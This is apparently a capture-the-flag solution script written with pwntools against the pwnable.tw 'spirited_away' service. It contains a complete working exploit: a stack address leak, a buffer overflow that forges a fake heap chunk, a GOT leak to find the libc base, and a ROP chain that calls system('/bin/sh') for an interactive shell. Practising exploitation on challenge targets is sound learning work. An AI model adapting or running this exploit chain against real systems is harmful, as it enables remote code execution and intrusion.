from pwn import *

pwnable = './spirited_away'

elf = ELF(pwnable)
libc = ELF('./libc_32.so.6')

context(terminal=['tmux', 'new-window'])
context(os = 'linux', arch = 'i386')

context.log_level = 'DEBUG'

#setarch $(uname -m) -R /bin/bash
#x/25wx 0xffffd5f0-16
#b *0x0804868f    <-----after name read
#b *0x080488c9    <-----after free
#x/45wx 0x0804b570-32
debug_set = ''
debug_set_1 = '''
    b *0x0804868f
    b *0x080486fd
    b *0x08048743
    b *0x0804885e
    b *0x080486c1
    b *0x0804864f
    b *0x0804875e
    b *0x08048771
    b *0x0804878a
    b *0x080487a0
    '''

debug_set_2 = '''
    b *0x080487cc
    b *0x804875e
    b *0x080488c9
    '''
debug_set_3 = '''
    b *0x080488c9 if $eax == 0xffffddc0
'''
debug_set_4 = ""

if len(sys.argv) > 2 and sys.argv[1] == 'debug':
    p = process(pwnable)
    gdb.attach(p, debug_set_3)
elif len(sys.argv) > 1 and sys.argv[1] == 'debug':
    #p = process("./seethefile", env=env)
    #gdb.attach(p, debug_set_1)
    p = process(["/tmp/ld-2.23.so", pwnable], env={"LD_PRELOAD":"./libc_32.so.6"})
    #p = process(pwnable)
    gdb.attach(p, debug_set_3)
else:
    #p = process('./seethefile')
    #env = {"LD_PRELOAD": os.path.join(os.getcwd(), "/root/libc_32.so.6")}
    #p = process(pwnable)
    p = remote('chall.pwnable.tw', 10204)


p.recvuntil("name:")
p.sendline("NAME")
p.recvuntil("age:")
p.sendline("32")
p.recvuntil("movie?")
p.sendline("aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaa")
p.recvuntil("taaa")
stack_addy = p.recv(4)
print("stack_addy :: " + hex(u32(stack_addy)))
spirit_chunk = u32(stack_addy) - 104
#0xffffd718+1704
print("spirit_chunk :: " + hex(spirit_chunk))
p.recvuntil("<y/n>:")
p.sendline("y")

for x in range(2, 11):
    #time.sleep(0.1)
    p.recvuntil("name:")
    p.sendline("chris")
    #time.sleep(0.1)
    p.recvuntil("age:")
    p.sendline("32")
    #time.sleep(0.1)
    p.recvuntil("movie?")
    p.sendline("REASON\x00")
    #time.sleep(0.1)
    p.recvuntil("comment:")
    p.sendline("COMMENT")
    #time.sleep(0.1)
    p.recvuntil("<y/n>:")
    p.sendline("y")

for x in range(11, 101):
    #time.sleep(0.1)
    p.recvuntil("age:")
    p.sendline("32")
    #time.sleep(0.1)
    p.recvuntil("movie?")
    p.sendline("REASON")
    #time.sleep(0.1)
    p.recvuntil("<y/n>:")
    p.sendline("y")
#for x in range(101, 106):
#    p.recvuntil("name:")
#    p.sendline("AAAA")
#    p.recvuntil("age:")
#    p.sendline("32")
#    p.recvuntil("movie?")
#    p.sendline("REASON")
#    p.recvuntil("comment:")
#    p.sendline("COMMENT")

print("x :: " + str(x))

#gdb.attach(p)
p.recvuntil("name:")
p.sendline("AAAA")
p.recvuntil("age:")
p.sendline("32")
p.recvuntil("movie?")
#p.sendline("Aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaa" + p32(0xffffdd60))
#p.sendline("dfrtghyu" + p32(0x10) + p32(0x10) + "Aaaabaaacaaa" + p32(0x10) + p32(0x10) + "hjkwgaaahaaa" + p32(0x10) + p32(0x10) + "oaaapaaaqaaaraaasaaataaauaaa" + p32(0xffffdd70))
#p.sendline(p32(0x40) + p32(0x40) + "A"*56 + p32(0) + p32(0x40) + "saaataaauaaa" + p32(0xffffdd68))
##
p.sendline(p32(0x40) + p32(0x40) + "A"*60 + p32(0x40))
p.recvuntil("comment:")
print("spirit_chunk :: " + hex(spirit_chunk))
p.send("A"*84 + p32(spirit_chunk))#vaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab")

p.recvuntil("<y/n>:")
p.sendline("y")

rop_puts = ROP(elf)
rop_puts.call(elf.plt['puts'], [elf.got['puts']])
rop_puts.call(elf.symbols['survey'])
#rop_puts.call(elf.symbols['main'])
print("rop_puts :: " + str(rop_puts))

p.recvuntil("name:")
p.sendline("aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaa" + str(rop_puts))
p.recvuntil("age:")
p.sendline("32")
p.recvuntil("movie?")
p.sendline("AAAA")
p.recvuntil("comment:")
p.sendline("AAAA")
p.recvuntil("<y/n>:")
p.sendline("n")
p.recvuntil("Bye!\n")
leaked_puts = p.recv(4)

print("leaked_puts :: " + hex(u32(leaked_puts)))


base = u32(leaked_puts) - libc.symbols['puts']
print("base :: " + hex(base))
libc.address = base
bin_shell = libc.search('/bin/sh').next()
system = libc.symbols['system']
print("shell :: " + hex(bin_shell))
rop_system = ROP(elf)
rop_system.call(system, [bin_shell])


p.recvuntil("name:")
p.sendline("HERE_NAME")
p.recvuntil("age:")
p.sendline("45")
p.recvuntil("movie?")
p.sendline("HERE_REASON")
p.recvuntil("comment:")
p.send("HERE_COMMENT")
p.recvuntil("<y/n>:")
p.sendline("y")


p.recvuntil("name:")
p.sendline("AAAA")
p.recvuntil("age:")
p.sendline("32")
p.recvuntil("movie?")
p.sendline(p32(0x40) + p32(0x40) + "A"*60 + p32(0x40))
p.recvuntil("comment:")
print("spirit_chunk :: " + hex(spirit_chunk))
p.send("A"*84 + p32(spirit_chunk+16))
p.recvuntil("<y/n>:")
p.sendline("y")



p.recvuntil("name:")
p.sendline("aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaa" + str(rop_system))
p.recvuntil("age:")
p.sendline("32")
p.recvuntil("movie?")
p.sendline("AAAA")
p.recvuntil("comment:")
p.sendline("BBBB")
p.recvuntil("<y/n>:")
p.sendline("n")


#p.recvuntil("name:")
#p.sendline("B"*110)
#p.recvuntil("age:")
#p.sendline("32")
#p.recvuntil("movie?")
#p.sendline("asd")
#p.recvuntil("comment:")
#p.sendline("Caaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaabl")
#p.recvuntil("<y/n>:")
#p.sendline("y")
#p.recvuntil("name:")
#p.sendline("C"*100)
#p.recvuntil("age:")
p.interactive()
#p.wait_for_close()

